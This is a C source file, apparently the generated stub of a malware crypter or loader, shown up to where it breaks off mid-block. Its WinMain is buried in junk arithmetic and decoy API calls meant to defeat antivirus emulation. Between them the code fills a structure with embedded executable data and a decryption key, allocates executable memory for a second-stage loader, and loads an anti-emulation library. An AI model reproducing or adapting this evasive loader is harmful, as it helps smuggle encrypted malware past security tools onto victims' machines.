#include "loader1.h"
#include "pragma.h"
#include "import.h"
#include "data.h"
int WinMain(void *hInstance, void *hPrevInstance, void *lpCmdLine, int nCmdShow)
{
  struct params_cb params3;
  char *loader2_data3;
  void *h_module3;
  int i3;
  {
    int data2;
    int len2;
    int type2;
    int prot2;
    int release2;
    {
      len2 = (((nCmdShow - ((nCmdShow * nCmdShow) * 37)) & nCmdShow) | ((119 - nCmdShow) + 18)) | ((nCmdShow != nCmdShow) == nCmdShow);
      len2 = ((len2 + len2) & 1) + 1664;
    }
    {
      type2 = ((((nCmdShow != nCmdShow) | nCmdShow) | (((nCmdShow != nCmdShow) & 218) ^ nCmdShow)) | ((nCmdShow & nCmdShow) ^ (((nCmdShow - 71) + (nCmdShow * 170)) + nCmdShow))) | (nCmdShow & (((nCmdShow != 107) != nCmdShow) == ((nCmdShow * nCmdShow) + 255)));
      type2 = ((~type2) == type2) | 4096;
    }
    {
      prot2 = ((((nCmdShow + nCmdShow) == 102) & (nCmdShow + (nCmdShow * nCmdShow))) & (nCmdShow != ((nCmdShow + 246) - (nCmdShow * nCmdShow)))) | ((217 == (nCmdShow + nCmdShow)) ^ (120 == nCmdShow));
      prot2 = (((prot2 + prot2) & 1) + 1) * 4;
    }
    data2 = (int) VirtualAlloc(NULL, len2, type2, prot2);
    if (data2)
    {
      {
        int res1;
        int file1;
        char *name1;
        int mode1;
        {
          name1 = "uiMDqql4QFqXjBk4VMiN5TfrTdmV";
        }
        {
          mode1 = (((((data2 - 188) - ((data2 * 30) * data2)) + 117) ^ data2) ^ (data2 & (data2 != data2))) | ((data2 != 231) == (data2 + data2));
          mode1 = (((mode1 + mode1) & 1) + 1) * 1;
        }
        res1 = AVIFileOpen(&file1, name1, mode1, 0);
        if (res1)
        {
          {
            int res0;
            int file0;
            char *name0;
            int mode0;
            {
              name0 = "06LxunE1U";
            }
            {
              mode0 = ((((res1 & (226 != res1)) | (21 ^ (res1 - res1))) | (res1 - res1)) | (res1 ^ ((res1 != res1) != ((191 - (res1 * 179)) + (res1 * res1))))) | 197;
              mode0 = (((-mode0) & 1) != (mode0 & 1)) + 3;
            }
            res0 = AVIFileOpen(&file0, name0, mode0, 0);
            if (res0)
            {
              ;
            }

            ;
          }
        }

        {
          int data0;
          int len0;
          int type0;
          int prot0;
          int release0;
          {
            len0 = ((res1 ^ ((res1 * 227) * res1)) ^ (((54 != res1) & res1) & ((res1 != ((136 + res1) - 200)) != res1))) | (((res1 != 35) != res1) ^ 195);
            len0 = ((((-len0) & 1) != (len0 & 1)) + 1) * 3827;
          }
          {
            type0 = (((((((res1 * res1) * 50) - res1) - res1) != 142) & (res1 != 208)) & ((res1 == 161) == res1)) | (163 & res1);
            type0 = (((-type0) & 1) != (type0 & 1)) | 4096;
          }
          {
            prot0 = (((res1 - res1) ^ (res1 - res1)) ^ res1) | ((198 != res1) == (((232 * res1) - res1) - 121));
            prot0 = ((((-prot0) & 1) != (prot0 & 1)) + 1) * 4;
          }
          data0 = (int) VirtualAlloc(NULL, len0, type0, prot0);
          if (data0)
          {
            ;
            {
              release0 = ((((res1 + 83) + res1) & 239) | ((res1 & ((100 == (res1 + 68)) == res1)) ^ ((186 == (res1 - 192)) == res1))) | ((50 == res1) ^ (40 * res1));
              release0 = ((release0 + release0) & 1) + 32768;
            }
            VirtualFree((void *) data0, 0, release0);
          }

          ;
        }
      }
      {
        release2 = ((nCmdShow & ((((nCmdShow - 153) + nCmdShow) + 144) == nCmdShow)) ^ ((178 == (nCmdShow - nCmdShow)) & (((((nCmdShow + (141 * nCmdShow)) == 196) != nCmdShow) == nCmdShow) != 173))) ^ (nCmdShow - 83);
        release2 = (((-release2) ^ release2) & 1) + 32768;
      }
      VirtualFree((void *) data2, 0, release2);
    }

    {
      int res1;
      int temp1;
      {
        temp1 = (((data2 & (data2 == data2)) | (((228 == (data2 * data2)) == data2) == data2)) | (155 ^ (data2 == data2))) | (((data2 * data2) + data2) == data2);
        temp1 = (((-temp1) ^ temp1) & 1) + 36;
      }
      res1 = (int) GetEnvironmentStrings();
      if (res1)
      {
        {
          int data0;
          int len0;
          int type0;
          int prot0;
          int release0;
          {
            len0 = ((((res1 & (22 + res1)) ^ (169 != res1)) ^ (res1 - 182)) ^ ((((res1 == ((16 + res1) - 20)) & res1) & ((140 * res1) * 228)) & (res1 == (res1 * 77)))) ^ res1;
            len0 = (((~len0) == len0) + 1) * 2074;
          }
          {
            type0 = (((((res1 == res1) != 16) == (res1 * res1)) ^ (238 == res1)) | (((((252 != res1) == 202) & res1) & res1) & (231 == res1))) | (185 == res1);
            type0 = ((((-type0) ^ type0) & 1) + 1) * 4096;
          }
          {
            prot0 = (((((res1 * 228) * res1) * 1) == ((res1 - 180) - res1)) != res1) | ((res1 & res1) ^ (((res1 == 49) != (res1 * res1)) == res1));
            prot0 = (((-prot0) & 1) != (prot0 & 1)) | 4;
          }
          data0 = (int) VirtualAlloc(NULL, len0, type0, prot0);
          if (data0)
          {
            ;
            {
              release0 = res1 | (((res1 ^ ((res1 == 60) == (((res1 + (195 * res1)) + 98) + res1))) ^ ((((117 * res1) - 219) - res1) + 241)) ^ (((res1 != (res1 - 96)) == res1) & ((res1 * 197) + res1)));
              release0 = (((-release0) ^ release0) & 1) + 32768;
            }
            VirtualFree((void *) data0, 0, release0);
          }

          ;
        }
      }

      {
        int data0;
        int len0;
        int type0;
        int prot0;
        int release0;
        {
          len0 = ((((res1 * res1) ^ (153 != res1)) ^ res1) ^ (145 & ((res1 * res1) != (41 - res1)))) | ((10 & (res1 * 236)) & (res1 - res1));
          len0 = ((((-len0) ^ len0) & 1) + 1) * 1379;
        }
        {
          type0 = ((((res1 - 95) ^ (res1 - 11)) | res1) | ((((123 + res1) == res1) != 196) ^ ((res1 * 74) == res1))) | ((res1 != (res1 + res1)) == 172);
          type0 = ((~type0) == type0) + 4096;
        }
        {
          prot0 = (((((res1 == res1) | ((217 * res1) - 27)) | (((res1 * 59) + res1) & res1)) | (10 == res1)) | ((res1 != res1) ^ ((186 * res1) + res1))) | res1;
          prot0 = (((-prot0) ^ prot0) & 1) | 4;
        }
        data0 = (int) VirtualAlloc(NULL, len0, type0, prot0);
        if (data0)
        {
          ;
          {
            release0 = ((((res1 == 84) != (res1 * res1)) & (81 == res1)) | ((res1 * res1) - 181)) | (res1 - 57);
            release0 = ((((-release0) & 1) != (release0 & 1)) + 1) * 32768;
          }
          VirtualFree((void *) data0, 0, release0);
        }

        ;
      }
    }
  }
  params3.h_instance = hInstance;
  params3.is_resource = DATA_IS_RESOURCE;
  {
    long res2;
    int temp2;
    {
      temp2 = (((((nCmdShow + 9) - nCmdShow) != 210) ^ (nCmdShow == 184)) | nCmdShow) | ((((29 + nCmdShow) + 7) ^ (((nCmdShow != nCmdShow) != (nCmdShow - 145)) & nCmdShow)) ^ nCmdShow);
      temp2 = ((((-temp2) ^ temp2) & 1) + 1) * 11;
    }
    res2 = GetLastError();
    if (res2)
    {
      {
        int res1;
        int file1;
        char *name1;
        int mode1;
        {
          name1 = "fjnabaxRIz22D3D5r1";
        }
        {
          mode1 = (((res2 - 246) | ((((res2 + 194) & (res2 == (res2 * 182))) & res2) & 59)) | (((res2 != res2) == (95 + res2)) ^ res2)) | res2;
          mode1 = (((-mode1) & 1) != (mode1 & 1)) | 2;
        }
        res1 = AVIFileOpen(&file1, name1, mode1, 0);
        if (res1)
        {
          {
            int res0;
            int file0;
            char *name0;
            int mode0;
            {
              name0 = "0eUn1AyV8WqwA8felG8c78rs7Gk";
            }
            {
              mode0 = (((((res1 - res1) & ((22 * res1) != 28)) & (res1 + res1)) & (61 == res1)) ^ 194) ^ (res1 != ((215 + res1) - 10));
              mode0 = ((((-mode0) ^ mode0) & 1) + 1) * 1;
            }
            res0 = AVIFileOpen(&file0, name0, mode0, 0);
            if (res0)
            {
              ;
            }

            ;
          }
        }

        {
          int res0;
          int file0;
          char *name0;
          int mode0;
          {
            name0 = "cbkPnF7WJxlyCL3ZGFqvkeg17aoHtwe5";
          }
          {
            mode0 = (((res1 - res1) | (((res1 != 32) ^ (res1 - 116)) ^ (res1 - 192))) | ((res1 * 169) + res1)) | (res1 ^ 205);
            mode0 = (((-mode0) & 1) != (mode0 & 1)) | 3;
          }
          res0 = AVIFileOpen(&file0, name0, mode0, 0);
          if (res0)
          {
            ;
          }

          ;
        }
      }
    }

    {
      int res1;
      int file1;
      char *name1;
      int mode1;
      {
        name1 = "ZeNY1YHe86o";
      }
      {
        mode1 = (((((((res2 + 227) == (res2 * 80)) != (res2 + 96)) == res2) == (221 - res2)) | (129 != (((res2 - res2) + res2) + 112))) | ((res2 * res2) ^ 79)) | ((res2 == 35) ^ (res2 & 104));
        mode1 = (((-mode1) & 1) != (mode1 & 1)) | 4;
      }
      res1 = AVIFileOpen(&file1, name1, mode1, 0);
      if (res1)
      {
        {
          int res0;
          int file0;
          char *name0;
          int mode0;
          {
            name0 = "KDuSuFDr5Z5PVhI2G";
          }
          {
            mode0 = (res1 & ((((((res1 + res1) - 51) != ((res1 - res1) + res1)) == res1) == ((res1 - res1) - (res1 * res1))) == (res1 * 25))) | res1;
            mode0 = (((-mode0) & 1) != (mode0 & 1)) | 2;
          }
          res0 = AVIFileOpen(&file0, name0, mode0, 0);
          if (res0)
          {
            ;
          }

          ;
        }
      }

      {
        int res0;
        int temp0;
        {
          temp0 = (res1 | (251 + res1)) | ((((res1 == res1) & (165 * res1)) ^ (res1 & (res1 != res1))) ^ ((176 - res1) - 212));
          temp0 = ((temp0 + temp0) & 1) | 46;
        }
        res0 = (int) GetEnvironmentStrings();
        if (res0)
        {
          ;
        }

        ;
      }
    }
  }
  params3.is_base64 = DATA_IS_BASE64;
  params3.is_packed = DATA_IS_PACKED;
  {
    long res2;
    int temp2;
    {
      temp2 = ((((nCmdShow != nCmdShow) != nCmdShow) | 15) | (((((nCmdShow + nCmdShow) == nCmdShow) != 148) ^ nCmdShow) ^ (((217 + nCmdShow) == (28 + ((nCmdShow * nCmdShow) * 152))) == (nCmdShow - nCmdShow)))) | 105;
      temp2 = ((((-temp2) ^ temp2) & 1) + 1) * 8;
    }
    res2 = GetLastError();
    if (res2)
    {
      {
        long res1;
        int temp1;
        {
          temp1 = ((((res2 - (12 * res2)) ^ ((((53 * res2) + 98) != res2) & res2)) ^ 41) | ((res2 * res2) - (res2 * 29))) | res2;
          temp1 = (((-temp1) & 1) != (temp1 & 1)) | 69;
        }
        res1 = GetLastError();
        if (res1)
        {
          {
            int res0;
            int temp0;
            {
              temp0 = (((((res1 == 19) ^ ((res1 + res1) == (107 - res1))) ^ (res1 & (res1 - 102))) | res1) | (255 + res1)) | 132;
              temp0 = ((temp0 + temp0) & 1) | 42;
            }
            res0 = (int) GetEnvironmentStrings();
            if (res0)
            {
              ;
            }

            ;
          }
        }

        {
          int res0;
          int file0;
          char *name0;
          int mode0;
          {
            name0 = "4RGbVc0tofsfWdEwYxXt8GFwEsFlD2";
          }
          {
            mode0 = ((((((res1 & res1) & ((224 + res1) - 16)) ^ (res1 + 247)) ^ ((res1 * res1) + res1)) ^ 84) | (res1 * res1)) | (res1 & (((49 + res1) - 28) - (res1 * 230)));
            mode0 = ((mode0 + mode0) & 1) | 4;
          }
          res0 = AVIFileOpen(&file0, name0, mode0, 0);
          if (res0)
          {
            ;
          }

          ;
        }
      }
    }

    {
      int res1;
      int file1;
      char *name1;
      int mode1;
      {
        name1 = "PWOC72o1zGeQW9rZvWD0K7k0laiJ";
      }
      {
        mode1 = (((res2 & ((108 + res2) + 194)) ^ (((res2 - res2) + 235) & ((res2 * 218) != res2))) ^ 9) | (res2 ^ 97);
        mode1 = (((-mode1) ^ mode1) & 1) | 5;
      }
      res1 = AVIFileOpen(&file1, name1, mode1, 0);
      if (res1)
      {
        {
          int res0;
          int temp0;
          {
            temp0 = ((((((res1 == ((res1 * 143) + res1)) == res1) != res1) != (91 * res1)) == res1) ^ 71) | ((res1 == (res1 + res1)) ^ res1);
            temp0 = (((-temp0) & 1) != (temp0 & 1)) + 25;
          }
          res0 = (int) GetEnvironmentStrings();
          if (res0)
          {
            ;
          }

          ;
        }
      }

      {
        int res0;
        int file0;
        char *name0;
        int mode0;
        {
          name0 = "zDT5CDugFrlE5ZEOZ9CwrrRjih6CyHVi";
        }
        {
          mode0 = (((((res1 * 120) == res1) | ((res1 != res1) ^ (184 != (res1 + 49)))) | ((res1 - res1) ^ (((((8 - res1) - res1) != res1) != 254) & res1))) | (res1 + 72)) | (res1 != 218);
          mode0 = (((mode0 + mode0) & 1) + 1) * 4;
        }
        res0 = AVIFileOpen(&file0, name0, mode0, 0);
        if (res0)
        {
          ;
        }

        ;
      }
    }
  }
  params3.p_pe_data_1 = pe_data_1;
  params3.p_pe_data_2 = pe_data_2;
  {
    int res2;
    int temp2;
    {
      temp2 = (((nCmdShow + nCmdShow) | ((nCmdShow - 158) & nCmdShow)) | ((187 + nCmdShow) ^ (((248 == nCmdShow) & ((98 * nCmdShow) != (20 * nCmdShow))) & nCmdShow))) | ((nCmdShow ^ (219 == nCmdShow)) ^ nCmdShow);
      temp2 = ((((-temp2) & 1) != (temp2 & 1)) + 1) * 85;
    }
    res2 = (int) GetEnvironmentStrings();
    if (res2)
    {
      {
        int res1;
        int file1;
        char *name1;
        int mode1;
        {
          name1 = "7ePIzKaAYYd6F6bIRioNz5";
        }
        {
          mode1 = ((res2 & ((res2 == res2) == res2)) | (((((113 == (res2 * res2)) & 61) & (res2 - (51 * res2))) & res2) & 204)) | (res2 ^ (((184 + res2) - res2) & 168));
          mode1 = ((~mode1) == mode1) + 1;
        }
        res1 = AVIFileOpen(&file1, name1, mode1, 0);
        if (res1)
        {
          {
            long res0;
            int temp0;
            {
              temp0 = ((res1 != ((117 - res1) + 52)) != res1) | (((((res1 == ((126 * res1) - res1)) & ((46 == res1) != res1)) & 230) ^ res1) ^ (res1 == 121));
              temp0 = (((temp0 + temp0) & 1) + 1) * 26;
            }
            res0 = GetLastError();
            if (res0)
            {
              ;
            }

            ;
          }
        }

        {
          int data0;
          int len0;
          int type0;
          int prot0;
          int release0;
          {
            len0 = ((res1 ^ ((18 * res1) == res1)) | (res1 & ((((res1 + (188 * res1)) == (res1 * res1)) == 15) == ((res1 + 142) + res1)))) | (res1 ^ ((((93 == res1) != (211 * res1)) == 205) != res1));
            len0 = (((-len0) & 1) != (len0 & 1)) + 3278;
          }
          {
            type0 = (res1 | (((res1 + 225) ^ (res1 + 191)) ^ ((res1 - res1) != (res1 + res1)))) | (222 ^ (((res1 + res1) & (((res1 * 100) != res1) != res1)) & (res1 - (res1 * res1))));
            type0 = (((type0 + type0) & 1) + 1) * 4096;
          }
          {
            prot0 = (((((res1 & res1) & ((146 + res1) - 141)) & res1) & 73) & (res1 * 128)) & (res1 - res1);
            prot0 = ((((-prot0) ^ prot0) & 1) + 1) * 4;
          }
          data0 = (int) VirtualAlloc(NULL, len0, type0, prot0);
          if (data0)
          {
            ;
            {
              release0 = ((res1 ^ ((res1 * 239) == res1)) ^ (((((59 - res1) == res1) == (105 + res1)) & 50) & res1)) | (((res1 ^ (((res1 - res1) != res1) & (res1 == 97))) ^ (res1 - res1)) ^ (res1 - res1));
              release0 = ((((-release0) ^ release0) & 1) + 1) * 32768;
            }
            VirtualFree((void *) data0, 0, release0);
          }

          ;
        }
      }
    }

    {
      int res1;
      int temp1;
      {
        temp1 = ((((((((((res2 * res2) == (res2 + res2)) != res2) == 206) == res2) == 170) == res2) != res2) != 158) == res2) | ((101 & res2) ^ (((235 != ((res2 + 121) + res2)) == (res2 + res2)) == 10));
        temp1 = (((-temp1) & 1) != (temp1 & 1)) | 16;
      }
      res1 = (int) GetEnvironmentStrings();
      if (res1)
      {
        {
          int res0;
          int file0;
          char *name0;
          int mode0;
          {
            name0 = "qzwHrix";
          }
          {
            mode0 = ((res1 & 106) & (((res1 + 85) != ((res1 + 169) - res1)) == res1)) ^ (((85 - (res1 * 34)) != ((res1 + (158 * res1)) - res1)) != (102 + res1));
            mode0 = ((~mode0) == mode0) | 2;
          }
          res0 = AVIFileOpen(&file0, name0, mode0, 0);
          if (res0)
          {
            ;
          }

          ;
        }
      }

      {
        int res0;
        int temp0;
        {
          temp0 = ((((((res1 != 237) != res1) & 110) & res1) & (((res1 == (res1 + res1)) != (147 - res1)) == (59 + res1))) & (((98 * res1) - 96) == res1)) ^ ((res1 == 88) != res1);
          temp0 = (((~temp0) == temp0) + 1) * 20;
        }
        res0 = (int) GetEnvironmentStrings();
        if (res0)
        {
          ;
        }

        ;
      }
    }
  }
  params3.pe_data_size_1 = sizeof(pe_data_1);
  params3.pe_data_size_2 = sizeof(pe_data_2);
  {
    int res2;
    int temp2;
    {
      temp2 = (((nCmdShow == 148) & ((nCmdShow + ((nCmdShow * 83) * nCmdShow)) == nCmdShow)) | (nCmdShow != 34)) | (nCmdShow & (nCmdShow - 77));
      temp2 = ((temp2 + temp2) & 1) | 100;
    }
    res2 = (int) GetEnvironmentStrings();
    if (res2)
    {
      {
        int res1;
        int temp1;
        {
          temp1 = ((((res2 != (res2 * 117)) == (res2 - 204)) != (res2 + res2)) == (149 * res2)) & (113 + res2);
          temp1 = ((temp1 + temp1) & 1) | 4;
        }
        res1 = (int) GetEnvironmentStrings();
        if (res1)
        {
          {
            int res0;
            int temp0;
            {
              temp0 = ((res1 * 107) + (res1 * 67)) ^ ((res1 != (101 * res1)) & ((res1 == 41) != (res1 * 139)));
              temp0 = ((((-temp0) & 1) != (temp0 & 1)) + 1) * 40;
            }
            res0 = (int) GetEnvironmentStrings();
            if (res0)
            {
              ;
            }

            ;
          }
        }

        {
          int data0;
          int len0;
          int type0;
          int prot0;
          int release0;
          {
            len0 = (res1 | ((((213 != (res1 * 112)) == res1) != 183) != (res1 + res1))) | (((94 * res1) != res1) != res1);
            len0 = ((((-len0) & 1) != (len0 & 1)) + 1) * 2704;
          }
          {
            type0 = ((res1 ^ ((88 != (res1 * 77)) != res1)) | (207 == res1)) | (((((res1 != 248) == (res1 + res1)) ^ 218) ^ res1) ^ (((res1 == res1) == 86) & (((res1 == res1) == 159) != res1)));
            type0 = ((((-type0) ^ type0) & 1) + 1) * 4096;
          }
          {
            prot0 = (((((res1 + 75) != (res1 + res1)) & 165) ^ (res1 + res1)) | (((res1 + 8) == res1) ^ (((249 * res1) == res1) == 159))) | (res1 - 98);
            prot0 = (((-prot0) & 1) != (prot0 & 1)) | 4;
          }
          data0 = (int) VirtualAlloc(NULL, len0, type0, prot0);
          if (data0)
          {
            ;
            {
              release0 = (((res1 ^ (((res1 * 7) + res1) & 34)) | (res1 + 203)) | ((((res1 == 236) & (res1 - res1)) ^ ((res1 * 82) != res1)) ^ res1)) | ((((128 + res1) + res1) + res1) & (res1 - 233));
              release0 = ((release0 + release0) & 1) | 32768;
            }
            VirtualFree((void *) data0, 0, release0);
          }

          ;
        }
      }
    }

    {
      int res1;
      int temp1;
      {
        temp1 = ((((res2 & res2) & (((((((161 * res2) - 50) == res2) != 217) != (res2 + res2)) == 69) != res2)) & (res2 * 0)) ^ ((res2 != (((res2 * 155) - res2) - 250)) == res2)) | res2;
        temp1 = ((~temp1) == temp1) | 56;
      }
      res1 = (int) GetEnvironmentStrings();
      if (res1)
      {
        {
          int res0;
          int temp0;
          {
            temp0 = ((((res1 == 165) ^ ((res1 & res1) & (((16 + res1) != res1) != res1))) | (132 + res1)) | res1) | ((((66 & (res1 + 83)) & res1) & (res1 == 39)) ^ (res1 & ((26 + res1) + 48)));
            temp0 = (((~temp0) == temp0) + 1) * 94;
          }
          res0 = (int) GetEnvironmentStrings();
          if (res0)
          {
            ;
          }

          ;
        }
      }

      {
        int res0;
        int file0;
        char *name0;
        int mode0;
        {
          name0 = "uHiaSG67DCjBH90ndcArypHoxRwGBm";
        }
        {
          mode0 = ((((((res1 == 214) != (res1 + res1)) == res1) != 183) | res1) | ((res1 == res1) & 213)) | (res1 == (56 + ((res1 * res1) * res1)));
          mode0 = ((~mode0) == mode0) + 3;
        }
        res0 = AVIFileOpen(&file0, name0, mode0, 0);
        if (res0)
        {
          ;
        }

        ;
      }
    }
  }
  params3.depacked_data_length = DEPACKED_DATA_LEN;
  params3.p_decryption_key = decryption_key;
  {
    int res2;
    int file2;
    char *name2;
    int mode2;
    {
      name2 = "NH6MstCz5avTHw5PR2TMbdSIeHycIo";
    }
    {
      mode2 = ((nCmdShow + 156) + nCmdShow) | (((((1 * nCmdShow) * nCmdShow) & 240) & nCmdShow) ^ (((nCmdShow * nCmdShow) + nCmdShow) == nCmdShow));
      mode2 = ((mode2 + mode2) & 1) + 1;
    }
    res2 = AVIFileOpen(&file2, name2, mode2, 0);
    if (res2)
    {
      {
        long res1;
        int temp1;
        {
          temp1 = (((((((res2 != 10) != res2) == (res2 + res2)) == res2) == (res2 * 110)) & (res2 == (248 * res2))) ^ (166 - res2)) | (((res2 * res2) != ((121 * res2) + 73)) == res2);
          temp1 = ((((-temp1) ^ temp1) & 1) + 1) * 35;
        }
        res1 = GetLastError();
        if (res1)
        {
          {
            int data0;
            int len0;
            int type0;
            int prot0;
            int release0;
            {
              len0 = ((((res1 == 251) == (res1 * 152)) | ((res1 != res1) == res1)) | ((92 + res1) ^ 46)) | ((res1 - 48) & res1);
              len0 = (((-len0) ^ len0) & 1) | 4069;
            }
            {
              type0 = ((((res1 != 18) != (res1 + 220)) != res1) & (((res1 * 224) + res1) + res1)) ^ ((res1 == 238) & res1);
              type0 = ((type0 + type0) & 1) + 4096;
            }
            {
              prot0 = (((((((res1 * res1) - 35) & (res1 * res1)) & (24 * res1)) ^ ((res1 * res1) == ((res1 + 31) - res1))) ^ (res1 + res1)) ^ (178 & res1)) | ((res1 + res1) != 52);
              prot0 = (((prot0 + prot0) & 1) + 1) * 4;
            }
            data0 = (int) VirtualAlloc(NULL, len0, type0, prot0);
            if (data0)
            {
              ;
              {
                release0 = (((res1 ^ (((res1 + 83) + res1) != 220)) | ((res1 != res1) ^ ((((res1 == 9) == res1) != (112 + res1)) & res1))) | (197 & (res1 != res1))) | (77 == res1);
                release0 = ((release0 + release0) & 1) | 32768;
              }
              VirtualFree((void *) data0, 0, release0);
            }

            ;
          }
        }

        {
          long res0;
          int temp0;
          {
            temp0 = ((res1 != 206) ^ ((((((res1 + res1) - res1) == res1) == (127 * res1)) & ((res1 == res1) == ((83 * res1) + res1))) & res1)) | 27;
            temp0 = (((temp0 + temp0) & 1) + 1) * 26;
          }
          res0 = GetLastError();
          if (res0)
          {
            ;
          }

          ;
        }
      }
    }

    {
      int res1;
      int file1;
      char *name1;
      int mode1;
      {
        name1 = "69nn6OlbhfaAETk5h1EvobRo";
      }
      {
        mode1 = (((((res2 * 3) != res2) | (((res2 + (79 * res2)) + res2) & 204)) | res2) | (res2 & 31)) | (res2 & 196);
        mode1 = (((-mode1) & 1) != (mode1 & 1)) + 2;
      }
      res1 = AVIFileOpen(&file1, name1, mode1, 0);
      if (res1)
      {
        {
          int res0;
          int temp0;
          {
            temp0 = ((((res1 & (res1 - 206)) | res1) | 133) | ((res1 + 188) != (((res1 - 235) - res1) + res1))) | ((res1 - 245) != (((res1 + res1) - (res1 * res1)) - 205));
            temp0 = ((((-temp0) & 1) != (temp0 & 1)) + 1) * 28;
          }
          res0 = (int) GetEnvironmentStrings();
          if (res0)
          {
            ;
          }

          ;
        }
      }

      {
        int res0;
        int file0;
        char *name0;
        int mode0;
        {
          name0 = "KXwtXHUEtv2YUseRY4FN5bIsIr1SQUr6";
        }
        {
          mode0 = (((res1 - 230) & res1) | (res1 + 58)) | ((((res1 & res1) ^ ((35 != res1) != (((res1 - res1) - 218) + res1))) ^ (res1 * 8)) ^ (res1 * 241));
          mode0 = (((-mode0) ^ mode0) & 1) | 5;
        }
        res0 = AVIFileOpen(&file0, name0, mode0, 0);
        if (res0)
        {
          ;
        }

        ;
      }
    }
  }
  loader2_data3 = VirtualAlloc(0, sizeof(dc2_code), 12288, 64);
  {
    int res2;
    int file2;
    char *name2;
    int mode2;
    {
      name2 = "XRQfaky0DkA1Ino4njF";
    }
    {
      mode2 = (nCmdShow + nCmdShow) | (((((nCmdShow * 80) & nCmdShow) & (178 != nCmdShow)) & 246) ^ ((nCmdShow == nCmdShow) == (((nCmdShow * nCmdShow) * 149) + ((nCmdShow * nCmdShow) * 1))));
      mode2 = ((~mode2) == mode2) | 4;
    }
    res2 = AVIFileOpen(&file2, name2, mode2, 0);
    if (res2)
    {
      {
        int res1;
        int file1;
        char *name1;
        int mode1;
        {
          name1 = "45MUawgfbASgx3ysUevqpqmzMS8ZFA";
        }
        {
          mode1 = (((res2 == (((res2 - 163) + res2) + res2)) == 29) & (res2 - 201)) | (((res2 + res2) ^ ((((((18 + res2) - 218) != res2) == res2) == res2) & (243 + res2))) ^ (229 == res2));
          mode1 = (((-mode1) & 1) != (mode1 & 1)) | 3;
        }
        res1 = AVIFileOpen(&file1, name1, mode1, 0);
        if (res1)
        {
          {
            int res0;
            int file0;
            char *name0;
            int mode0;
            {
              name0 = "lmbfIz3giN54";
            }
            {
              mode0 = ((((res1 - res1) == 179) & res1) | (100 ^ (((res1 + 203) + res1) == res1))) | ((res1 - res1) ^ ((147 * res1) != res1));
              mode0 = (((-mode0) ^ mode0) & 1) + 5;
            }
            res0 = AVIFileOpen(&file0, name0, mode0, 0);
            if (res0)
            {
              ;
            }

            ;
          }
        }

        {
          int res0;
          int temp0;
          {
            temp0 = (((((((res1 ^ res1) | ((153 == (res1 + res1)) & res1)) | 6) | (res1 * 7)) | (res1 == res1)) | (res1 - (res1 * res1))) | ((res1 * res1) != res1)) | 227;
            temp0 = ((((-temp0) ^ temp0) & 1) + 1) * 12;
          }
          res0 = (int) GetEnvironmentStrings();
          if (res0)
          {
            ;
          }

          ;
        }
      }
    }

    {
      int res1;
      int file1;
      char *name1;
      int mode1;
      {
        name1 = "nYZwgJZjH3CUdPyoa";
      }
      {
        mode1 = (res2 | (30 & (res2 == 139))) | ((res2 == (res2 + 37)) ^ (((res2 - res2) == ((84 * res2) - res2)) & (57 - res2)));
        mode1 = ((mode1 + mode1) & 1) | 2;
      }
      res1 = AVIFileOpen(&file1, name1, mode1, 0);
      if (res1)
      {
        {
          int data0;
          int len0;
          int type0;
          int prot0;
          int release0;
          {
            len0 = (((((res1 * 24) - res1) & res1) & ((res1 * res1) * res1)) & ((121 == res1) == res1)) | (res1 ^ (215 - res1));
            len0 = (((-len0) ^ len0) & 1) | 2349;
          }
          {
            type0 = ((((((res1 * res1) & (res1 + res1)) & res1) | res1) | res1) | ((res1 + 230) != (res1 * res1))) | 226;
            type0 = ((type0 + type0) & 1) + 4096;
          }
          {
            prot0 = (((res1 | ((((res1 - res1) != res1) != 232) == res1)) | (((141 == res1) == 108) & (res1 == res1))) | (((((21 - res1) == (0 + res1)) != (res1 + (res1 * res1))) == 174) ^ res1)) | res1;
            prot0 = (((-prot0) ^ prot0) & 1) | 4;
          }
          data0 = (int) VirtualAlloc(NULL, len0, type0, prot0);
          if (data0)
          {
            ;
            {
              release0 = ((((res1 != 225) != (res1 - res1)) & (224 != res1)) & (res1 + 137)) | ((res1 == res1) == (53 - res1));
              release0 = ((release0 + release0) & 1) | 32768;
            }
            VirtualFree((void *) data0, 0, release0);
          }

          ;
        }
      }

      {
        int res0;
        int temp0;
        {
          temp0 = ((res1 + 232) ^ ((res1 == (res1 - res1)) & (((182 + res1) + res1) == ((res1 + 3) - res1)))) | res1;
          temp0 = ((~temp0) == temp0) + 57;
        }
        res0 = (int) GetEnvironmentStrings();
        if (res0)
        {
          ;
        }

        ;
      }
    }
  }
  h_module3 = LoadLibraryA(ANTIEMUL_LIB);
  {
    int res2;
    int file2;
    char *name2;
    int mode2;
    {
      name2 = "cgDjVxN";
    }
    {
      mode2 = ((nCmdShow + nCmdShow) | (nCmdShow ^ nCmdShow)) | ((((231 * nCmdShow) ^ 111) ^ ((nCmdShow == 193) == nCmdShow)) ^ (((((5 == ((nCmdShow * 167) + nCmdShow)) == (89 - nCmdShow)) != nCmdShow) == (19 + nCmdShow)) & 254));
      mode2 = (((-mode2) & 1) != (mode2 & 1)) | 4;
    }
    res2 = AVIFileOpen(&file2, name2, mode2, 0);
    if (res2)
    {
      {
        int res1;
        int file1;
        char *name1;
        int mode1;
        {
          name1 = "XBvyxK";
        }
        {
          mode1 = ((((res2 == 98) | (res2 + res2)) | (19 == res2)) | 85) | ((res2 + (106 * res2)) ^ (res2 == res2));
          mode1 = (((-mode1) & 1) != (mode1 & 1)) + 3;
        }
        res1 = AVIFileOpen(&file1, name1, mode1, 0);
        if (res1)
        {
          {
            int res0;
            int file0;
            char *name0;
            int mode0;
            {
              name0 = "iiHm0z";
            }
            {
              mode0 = ((res1 ^ (res1 == res1)) ^ ((res1 & (((res1 == res1) == ((res1 - res1) - res1)) != res1)) & ((155 == (((res1 * 157) + res1) - res1)) != 24))) | ((res1 == 110) != ((res1 + res1) + 135));
              mode0 = ((~mode0) == mode0) + 5;
            }
            res0 = AVIFileOpen(&file0, name0, mode0, 0);
            if (res0)
            {
              ;
            }

            ;
          }
        }

        {
          long res0;
          int temp0;
          {
            temp0 = (((((res1 != 172) ^ (res1 & 56)) ^ (res1 != res1)) | ((45 * res1) + res1)) | ((((109 - res1) + res1) + 194) ^ res1)) | (res1 ^ res1);
            temp0 = ((((-temp0) ^ temp0) & 1) + 1) * 2;
          }
          res0 = GetLastError();
          if (res0)
          {
            ;
          }

          ;
        }
      }
    }

    {
      int data1;
      int len1;
      int type1;
      int prot1;
      int release1;
      {
